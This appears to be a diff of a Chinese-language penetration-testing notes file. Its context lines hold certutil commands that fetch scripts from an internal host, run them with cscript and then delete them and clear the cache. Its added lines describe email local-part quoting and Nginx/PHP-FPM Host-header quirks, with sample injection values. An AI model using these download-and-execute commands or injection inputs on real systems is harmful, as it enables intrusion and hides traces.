@@ -278,3 +278,23 @@ certutil -urlcache -split -f http://192.168.254.102:80/a.txt delete
 certutil -urlcache -split -f http://192.168.254.102:80/a a.js && cscript a.js &&  del a.js && certutil -urlcache -split -f http://192.168.254.102:80/a delete
 certutil -urlcache -split -f http://192.168.254.102:80/abc a.vbs && cscript a.vbs &&  del a.vbs && certutil -urlcache -split -f http://192.168.254.102:80/abc delete
 
+
+
+git Bare 是为了分享
+RFC 3696规定，邮箱地址分为local part和domain part两部分。local part中包含特殊字符，需要如下处理：
+
+1.将特殊字符用\转义，如Joe\'Blow@example.com
+2.将local part包裹在双引号中，如"Joe'Blow"@example.com
+3.local part长度不超过64个字符
+虽然PHP没有完全按照RFC 3696进行检测，但支持上述第2种写法。
+
+"@aaa'"@example.com 合法邮箱
+Nginx在处理Host的时候，会将Host用冒号分割成hostname和port，port部分被丢弃  2018.mhz.pw:xxx'"@example.com
+当我们传入两个Host头的时候，Nginx将以第一个为准，而PHP-FPM将以第二个为准
+
+apache 只允许有一个Host头，PORT部分只能为数字
+
+
+
+
+
